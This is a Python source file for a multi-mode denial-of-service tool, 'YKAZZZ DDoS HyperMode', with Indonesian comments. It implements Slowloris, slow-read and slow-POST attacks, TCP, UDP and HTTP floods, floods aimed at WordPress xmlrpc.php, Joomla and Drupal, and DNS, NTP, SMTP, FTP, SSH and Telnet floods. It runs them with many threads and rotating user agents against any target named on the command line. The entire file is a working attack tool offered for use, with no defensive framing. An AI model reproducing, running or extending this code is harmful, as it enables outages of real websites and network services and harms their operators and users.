#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import socket
import threading
import time
import random
import ssl
import sys
import os
from datetime import datetime

# ================== WARNA ==================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ================== BANNER ==================
banner = f"""
{RED}{BOLD}
>====>     >====>                  >=>>=>   >=======> >======>   >====>  
>=>   >=>  >=>   >=>             >=>    >=> >=>       >=>    >=> >=>   >=>
>=>    >=> >=>    >=>    >=>      >=>       >=>       >=>    >=> >=>    >=>
>=>    >=> >=>    >=>  >=>  >=>     >=>     >=====>   >======>   >=>    >=>
>=>    >=> >=>    >=> >=>    >=>       >=>  >=>       >=>        >=>    >=>
>=>   >=>  >=>   >=>   >=>  >=>  >=>    >=> >=>       >=>        >=>   >=>
>====>     >====>        >=>       >=>>=>   >=>       >=>        >====>
HYPERMODE - FULL PACK EDITION
{RESET}
"""

print(banner)

# ================== USER AGENTS ==================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

# ================== MODES ==================
MODES = {
    'slowloris': 'Slowloris - Ninja Mode',
    'slowread': 'Slowread - RAM Eater',
    'slowpost': 'Slowpost - Connection Killer',
    '404': '404 Flood - Log Flooder',
    'tcpflood': 'TCP Flood',
    'udpflood': 'UDP Flood',
    'httpflood': 'HTTP Flood',
    'httpsflood': 'HTTPS Flood',
    'getflood': 'GET Flood',
    'postflood': 'POST Flood',
    'headflood': 'HEAD Flood',
    'wpflood': 'WordPress Flood',
    'joomlaflood': 'Joomla Flood',
    'drupalflood': 'Drupal Flood',
    'phpflood': 'PHP Flood',
    'dnsflood': 'DNS Flood',
    'ntpflood': 'NTP Flood',
    'smtpflood': 'SMTP Flood',
    'ftpflood': 'FTP Flood',
    'sshflood': 'SSH Flood',
    'telnetflood': 'Telnet Flood',
}

# ================== ATTACK CLASSES (Full, tidak diringkas) ==================
class RTAAttacks:
    @staticmethod
    def slowloris(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\n".encode())
            return s
        except:
            return None

    @staticmethod
    def slowread(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            files = ['/index.html', '/style.css', '/script.js', '/file_besar.dat']
            s.send(f"GET {random.choice(files)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode())
            return s
        except:
            return None

    @staticmethod
    def slowpost(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            content_length = random.randint(100000, 500000)
            s.send(f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {content_length}\r\n\r\n".encode())
            s.send(b"data=")
            return s
        except:
            return None

    @staticmethod
    def fourzerofour(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            names = ['bebek', 'ayam', 'kucing', 'ikan', 'burung', 'sapi']
            exts = ['.dat', '.jpg', '.png', '.zip', '.rar']
            fake_file = f"/{random.choice(names)}_{random.randint(1000,9999)}{random.choice(exts)}"
            s.send(f"GET {fake_file} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode())
            return s
        except:
            return None

    @staticmethod
    def maintain(s, mode):
        try:
            if mode == 'slowloris':
                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1,9999)}\r\n".encode())
            elif mode in ['slowread', '404']:
                s.recv(1)
            elif mode == 'slowpost':
                s.send(b"x")
            return True
        except:
            return False


class YHCAttacks:
    @staticmethod
    def tcpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def udpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(random.randint(64, 1024))
            s.sendto(data, (target, port))
            return 1
        except:
            return 0


class WebAttacks:
    @staticmethod
    def httpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            paths = ['/', '/index.html', '/about', '/contact', '/products']
            request = f"GET {random.choice(paths)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def httpsflood(target, port, use_ssl=False):
        return WebAttacks.httpflood(target, port, True)

    @staticmethod
    def getflood(target, port, use_ssl=False):
        return WebAttacks.httpflood(target, port, use_ssl)

    @staticmethod
    def postflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            data = f"data={random.randint(1000,9999)}&submit=1"
            request = f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(data)}\r\n\r\n{data}"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def headflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            request = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0


class CMSAttacks:
    @staticmethod
    def wpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            request = f"POST /xmlrpc.php HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Type: text/xml\r\nContent-Length: {len(xml)}\r\n\r\n{xml}"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def joomlaflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            options = ['com_users', 'com_content', 'com_admin', 'com_cache']
            request = f"GET /index.php?option={random.choice(options)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def drupalflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            nodes = [f"node/{random.randint(1,1000)}", f"user/{random.randint(1,100)}"]
            request = f"GET /{random.choice(nodes)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def phpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            php_files = ['index.php', 'config.php', 'wp-config.php', 'login.php', 'admin.php']
            request = f"GET /{random.choice(php_files)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
            s.send(request.encode())
            s.close()
            return 1
        except:
            return 0


class AppLayerAttacks:
    @staticmethod
    def dnsflood(target, port=53, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            domains = ['google.com', 'facebook.com', 'youtube.com', 'yahoo.com', 'amazon.com']
            domain = random.choice(domains)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            qname = b''
            for part in domain.split('.'):
                qname += bytes([len(part)]) + part.encode()
            qname += b'\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            query = transaction_id + flags + questions + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + qname + qtype + qclass
            s.sendto(query, (target, port))
            return 1
        except:
            return 0

    @staticmethod
    def ntpflood(target, port=123, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            payload = b'\x1b' + 47 * b'\0'
            s.sendto(payload, (target, port))
            return 1
        except:
            return 0

    @staticmethod
    def smtpflood(target, port=25, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            commands = ["HELO example.com\r\n", "MAIL FROM: <test@example.com>\r\n", "RCPT TO: <target@example.com>\r\n", "QUIT\r\n"]
            for cmd in commands[:random.randint(1,3)]:
                try:
                    s.send(cmd.encode())
                    time.sleep(0.1)
                except:
                    break
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def ftpflood(target, port=21, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            commands = ["USER anonymous\r\n", "PASS anonymous@\r\n", "QUIT\r\n"]
            for cmd in commands[:random.randint(1,2)]:
                try:
                    s.send(cmd.encode())
                    time.sleep(0.1)
                except:
                    break
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def sshflood(target, port=22, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            ssh_versions = ["SSH-2.0-OpenSSH_8.2\r\n", "SSH-2.0-OpenSSH_7.9\r\n"]
            s.send(random.choice(ssh_versions).encode())
            try:
                s.recv(1024)
            except:
                pass
            s.close()
            return 1
        except:
            return 0

    @staticmethod
    def telnetflood(target, port=23, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.send(b'\xff\xfd\x22')
            try:
                s.recv(1024)
            except:
                pass
            s.close()
            return 1
        except:
            return 0


# ================== ATTACK THREAD ==================
class AttackThread(threading.Thread):
    def __init__(self, target, port, mode, duration, rate, use_ssl):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port
        self.mode = mode
        self.duration = duration
        self.rate = rate
        self.use_ssl = use_ssl
        self.running = True
        self.requests_sent = 0

    def run(self):
        start_time = time.time()
        while self.running and (time.time() - start_time < self.duration):
            try:
                if self.mode == 'slowloris':
                    s = RTAAttacks.slowloris(self.target, self.port, self.use_ssl)
                    if s:
                        RTAAttacks.maintain(s, 'slowloris')
                elif self.mode == 'slowread':
                    s = RTAAttacks.slowread(self.target, self.port, self.use_ssl)
                    if s:
                        RTAAttacks.maintain(s, 'slowread')
                elif self.mode == 'slowpost':
                    s = RTAAttacks.slowpost(self.target, self.port, self.use_ssl)
                    if s:
                        RTAAttacks.maintain(s, 'slowpost')
                elif self.mode == '404':
                    s = RTAAttacks.fourzerofour(self.target, self.port, self.use_ssl)
                    if s:
                        RTAAttacks.maintain(s, '404')
                elif self.mode == 'tcpflood':
                    YHCAttacks.tcpflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'udpflood':
                    YHCAttacks.udpflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'httpflood':
                    WebAttacks.httpflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'httpsflood':
                    WebAttacks.httpsflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'getflood':
                    WebAttacks.getflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'postflood':
                    WebAttacks.postflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'headflood':
                    WebAttacks.headflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'wpflood':
                    CMSAttacks.wpflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'joomlaflood':
                    CMSAttacks.joomlaflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'drupalflood':
                    CMSAttacks.drupalflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'phpflood':
                    CMSAttacks.phpflood(self.target, self.port, self.use_ssl)
                elif self.mode == 'dnsflood':
                    AppLayerAttacks.dnsflood(self.target, 53, self.use_ssl)
                elif self.mode == 'ntpflood':
                    AppLayerAttacks.ntpflood(self.target, 123, self.use_ssl)
                elif self.mode == 'smtpflood':
                    AppLayerAttacks.smtpflood(self.target, 25, self.use_ssl)
                elif self.mode == 'ftpflood':
                    AppLayerAttacks.ftpflood(self.target, 21, self.use_ssl)
                elif self.mode == 'sshflood':
                    AppLayerAttacks.sshflood(self.target, 22, self.use_ssl)
                elif self.mode == 'telnetflood':
                    AppLayerAttacks.telnetflood(self.target, 23, self.use_ssl)

                self.requests_sent += 1
                time.sleep(0.01)

            except:
                pass

    def stop(self):
        self.running = False


# ================== ARGUMENT PARSER ==================
def get_args():
    parser = argparse.ArgumentParser(description="YKAZZZ DDoS HyperMode - Full Pack Edition")
    parser.add_argument("-t", "--target", required=True, help="Target IP or Domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port (default: 80)")
    parser.add_argument("-m", "--mode", required=True, choices=MODES.keys(), help="Attack mode")
    parser.add_argument("-th", "--threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds (default: 60)")
    parser.add_argument("-r", "--rate", type=int, default=10, help="Rate limit per thread (0 = unlimited)")
    parser.add_argument("-s", "--ssl", action="store_true", help="Use HTTPS/SSL")

    return parser.parse_args()


# ================== MAIN ==================
def main():
    args = get_args()

    print(f"{GREEN}[+] Target   : {args.target}:{args.port}{RESET}")
    print(f"{GREEN}[+] Mode     : {MODES[args.mode]}{RESET}")
    print(f"{GREEN}[+] Threads  : {args.threads}{RESET}")
    print(f"{GREEN}[+] Duration : {args.duration} seconds{RESET}")
    print(f"{GREEN}[+] SSL      : {'Enabled' if args.ssl else 'Disabled'}{RESET}\n")

    threads_list = []
    for i in range(args.threads):
        t = AttackThread(args.target, args.port, args.mode, args.duration, args.rate, args.ssl)
        t.start()
        threads_list.append(t)
        time.sleep(0.01)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Attack dihentikan oleh user{RESET}")

    for t in threads_list:
        t.stop()

    for t in threads_list:
        t.join(timeout=1)

    print(f"\n{GREEN}[✓] Attack selesai!{RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped by user{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    